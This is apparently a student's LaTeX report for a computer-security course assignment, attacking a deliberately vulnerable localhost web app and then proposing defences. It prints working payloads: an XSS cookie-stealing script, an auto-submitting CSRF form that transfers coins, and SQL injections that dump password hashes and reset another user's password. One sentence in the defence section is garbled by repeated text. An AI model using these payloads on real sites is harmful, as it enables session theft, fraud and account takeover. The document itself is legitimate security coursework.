@@ -1,0 +1,176 @@
+\documentclass[a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath}
+\usepackage{amssymb}
+\usepackage{caption}
+\usepackage{mathtools}
+\usepackage{amsfonts}
+\usepackage{lastpage}
+\usepackage{tikz}
+\usepackage{float}
+\usepackage{textcomp}
+\usetikzlibrary{patterns}
+\usepackage{pdfpages}
+\usepackage{gauss}
+\usepackage{fancyvrb}
+\usepackage[table]{colortbl}
+\usepackage{fancyhdr}
+\usepackage{graphicx}
+\usepackage[margin=2.5 cm]{geometry}
+
+\definecolor{listinggray}{gray}{0.9}
+\usepackage{listings}
+\lstset{
+	language=,
+	literate=
+		{æ}{{\ae}}1
+		{ø}{{\o}}1
+		{å}{{\aa}}1
+		{Æ}{{\AE}}1
+		{Ø}{{\O}}1
+		{Å}{{\AA}}1,
+	backgroundcolor=\color{listinggray},
+	tabsize=3,
+	rulecolor=,
+	basicstyle=\scriptsize,
+	upquote=true,
+	aboveskip={0.2\baselineskip},
+	columns=fixed,
+	showstringspaces=false,
+	extendedchars=true,
+	breaklines=true,
+	prebreak =\raisebox{0ex}[0ex][0ex]{\ensuremath{\hookleftarrow}},
+	frame=single,
+	showtabs=false,
+	showspaces=false,
+	showlines=true,
+	showstringspaces=false,
+	identifierstyle=\ttfamily,
+	keywordstyle=\color[rgb]{0,0,1},
+	commentstyle=\color[rgb]{0.133,0.545,0.133},
+	stringstyle=\color[rgb]{0.627,0.126,0.941},
+  moredelim=**[is][\color{blue}]{@}{@},
+}
+
+\lstdefinestyle{base}{
+  emptylines=1,
+  breaklines=true,
+  basicstyle=\ttfamily\color{black},
+}
+
+\pagestyle{fancy}
+\def\checkmark{\tikz\fill[scale=0.4](0,.35) -- (.25,0) -- (1,.7) -- (.25,.15) -- cycle;}
+\newcommand*\circled[1]{\tikz[baseline=(char.base)]{
+            \node[shape=circle,draw,inner sep=2pt] (char) {#1};}}
+\newcommand*\squared[1]{%
+  \tikz[baseline=(R.base)]\node[draw,rectangle,inner sep=0.5pt](R) {#1};\!}
+\newcommand{\comment}[1]{%
+  \text{\phantom{(#1)}} \tag{#1}}
+\def\el{[\![}
+\def\er{]\!]}
+\def\dpip{|\!|}
+\def\MeanN{\frac{1}{N}\sum^N_{n=1}}
+\cfoot{Page \thepage\ of \pageref{LastPage}}
+\DeclareGraphicsExtensions{.pdf,.png,.jpg}
+\author{Nikolaj Dybdahl Rathcke (rfq695)}
+\title{Proactive Computer Security \\ Assignment 1}
+\lhead{PCS}
+\rhead{Assignment 1}
+
+\begin{document}
+\maketitle
+
+\section{Part 1}
+\subsection{Attack A}
+We want to steal the cookie of the user "rloewe". We will use a javascript injection that creates a POST-request  which sends his cookie back to us, in a message we suspect he will open. The message we send him looks like this: \\
+\begin{lstlisting}
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://localhost/messages.php", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("user=you&headline=cookiesteal&message="+document.cookie+"&message_submit=Send");
+</script>
+\end{lstlisting}
+What it does is that when the user clicks on the headline (named cookiesteal in the request, which it probably shouldn't be) it loads the message, which is snippet of javascript code.
+This code forges the POST-request which sends a message to the user "you", with message \texttt{document.cookie}. The cookie is rloewe's own as it is him who is logged in and therefore it looks like he sends it. We know what the request looks like simply by inspecting a "test" request.
+
+\subsection{Attack B}
+The HTML document can be found in \texttt{src/attackB}, but the code that performs the attack can be seen below. It is all placed in the body of the HTML document. \\
+\begin{lstlisting}
+<form id="barbarbar" target="iframe" method="POST" action="http://localhost/transfer.php">
+<input type="hidden" name="coins" value="10"/>
+<input type="hidden" name="recipient" value="you"/>
+<input type="hidden" name="submission" value="Send"/>
+<input type="submit" value=""/>
+</form>
+<iframe name="iframe"></iframe>
+<script type="text/javascript">
+    document.getElementById('barbarbar').submit();
+    window.location="http://yesimparanoid.com/";
+</script>
+\end{lstlisting}
+To overcome the problem of not showing \texttt{localhost} in the URL at any time, I made use of \texttt{iframe}. It is a way to embed another document within the current HTML document. In the inline frame, we basically fill the data for the form on the page \texttt{/transfer.php} as we know what parameters is needed. Namely, we set the parameter \texttt{coins} to $10$, the \texttt{recipient} to "you" as we want to send $10$ coins to ourselves. Using javascript, we can automatically submit the filled form and to avoid any suspicion we instantly redirect them to \texttt{http://yesimparanoid.com/} on the subsequent line. As of submission time, the site looks down, which makes the attack quite obvious as it does not load anything. Obviously, we would need a working site to redirect to make the attack effective.
+
+\newpage
+\section{Part 2}
+The injection for getting a list of all user and their personal data is on the page \texttt{/messages.php}. By inspecting the source code, we can find the following SQL query: \\
+\begin{lstlisting}
+$sql = "INSERT INTO Message (FromID, ToID, Headline, Message) " .
+       " VALUES ('$from', '$to', '$headline', '$message')";
+\end{lstlisting}
+We exploit that we can make an SQL query as the headline parameter, the headline looks like this: \\
+\begin{lstlisting}
+Usernames Passwords', (Select group_concat(Username, ' ', Password) From Person));#"
+\end{lstlisting}
+The headline itself is just "Usernames Passwords", but this is where we inject SQL query. We use \texttt{group\_concat} to get all usernames and passwords from th etable "Person". We could get more personal data simply by listing more fields in the Person table. If we wanted to crack the passwords, we would need to take out the salt as well, but I have skipped this part as I do not see it as part of the task. To make sure the SQL statement is valid, we use the character "\#" to comment out the rest of the SQL statement. The injection returns with the usernames and hashed passwords:
+\begin{verbatim}
+  kflarsen 29006d99bd6d477664f43ee3a5dde925,
+  br0ns 54822fa5a4ea6ca8fea0ade431756664,
+  kokjo fe7ecc4de28b2c83c016b5c6c2acd826,
+  kristoff3r fe7ecc4de28b2c83c016b5c6c2acd826,
+  NicolaiNebel fe7ecc4de28b2c83c016b5c6c2acd826,
+  rloewe 7bfd638c108b8dba714aeb2e8349603c,
+  you 5a8441c3702aacd4103fd8675692f015
+\end{verbatim}
+These are the users that are originally in the database. I excluded the accounts I made. For the second part of the task, to change the password of the user "br0ns", we made the injection on the page \texttt{/index.php}. If we inspect hte SQL query: \\
+\begin{lstlisting}
+$sql = "UPDATE Person SET Profile='$profile' ".
+       "WHERE PersonID=$user->id";
+\end{lstlisting}
+We see that we can in a similar manner exploit the SET part and outcommenting the WHERE part. This is done with the following SQL injection: \\
+\begin{lstlisting}
+lemon squeez', Password='fd2f4fecfd71889b4f30ce07be1155c1', Salt='peaz'
+WHERE Username='br0ns'#"
+\end{lstlisting}
+So what happens is that we give a parameter for the profile text ("lemon squeezy") and inject the field we want to set. In this case we want to set the password to "ez", but this parameter is given as the hashed password. Therefore we need to change the salt as well. We set this to "peaz" and by calculating the MD5 hash of "ezpeaz", we can insert the hashed password. Obviously, we need to do this for the user "br0ns", so update it for that username. We end by outcommenting the rest of the original query to make it valid. After doing this, I was able to login as "br0ns" with password "ez".
+
+\section{Part 3}
+One way to secure yourself (or minimize the risk for) against SQL injections is by using prepared statement. The idea is all SQL queries are already defined by the developer and the parameters are passed to the query later. Doing this ensures the database can distinguish between actual code and the parameters, which was the reason we could perform the exploits in part $2$. If we look at the vulnerability we used to fetch users and their data: \\
+\begin{lstlisting}
+$from = $user->id;
+$to = $row["PersonID"];
+$headline = $_POST["headline"];
+$message = $_POST["message"];
+$sql = "INSERT INTO Message (FromID, ToID, Headline, Message) " .
+       " VALUES ('$from', '$to', '$headline', '$message')";
+\end{lstlisting}
+If we want this to make use of prepared statements, in MySQL, we could use \texttt{prepare()} function to prepare an SQL query with some connection \texttt{conn}: \\
+\begin{lstlisting}
+$sql = $conn->prepare("INSERT INTO Message (FromID, ToID, Headline, Message) " .
+                      " VALUES (?, ?, ?, ?)");
+\end{lstlisting}
+Note that we use question marks in the position where we expect some kind of user input. Using the \texttt{bind\_params()} in the following way: \\
+\begin{lstlisting}
+$sql = bind_params("ssss", $from, $to, $headline, $message);
+\end{lstlisting}
+What it does is that it binds the parameters to the query. The first argument determines what kind of input we expect (in this case it is strings for all of them). When the database expects the input to be strings, we can try to avoid the SQL injections. To execute the query, we use something like: \\
+\begin{lstlisting}
+$sql->execute();
+\end{lstlisting}
+There also exists function that does this for you if you want to avoid the tedious work of doing this everywhere you might make an SQL query. \\
+To prevent attack A, we would need to do some HTML sanitization, that is, we could either have a whitelist which allows for HTML tags such as "<b>", "<iTo prevent attack A, we would need to do some HTML sanitization, that is, we could either have a whitelist (or blacklist) which allows for HTML tags such as "<b>", "<i>" or "<u>", but not include tags such as the "<script>" that we used to to perform the attack. So in the case of the attack A, we would take the message to be send and strip it of non-legal tags. If we used a blacklist approach, we would strip it of illegal tags. \\
+To prevent an attack B, one of the most common techniques is to generate a random token for each session. Whenever the user then makes a GET or POST request, the token is passed along as hidden output to validate that the input by comparing it with the user's session token. This means that if an attacker tries to forge a request, he would need to know the session token as well. \\
+\\
+I have not actually implemented the proposed solutions, so the proposed security measures have not been tested either.
+
+\end{document}
